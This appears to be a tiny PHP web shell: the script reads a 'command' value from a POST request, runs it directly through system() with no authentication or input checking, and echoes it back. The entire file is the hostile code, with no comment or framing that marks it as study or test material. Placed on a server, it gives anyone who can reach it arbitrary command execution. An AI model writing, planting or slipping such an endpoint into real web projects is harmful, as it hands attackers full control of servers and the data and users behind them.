<?php
	$command = $_POST['command'];
	
	system($command);
	
	echo $command;
?>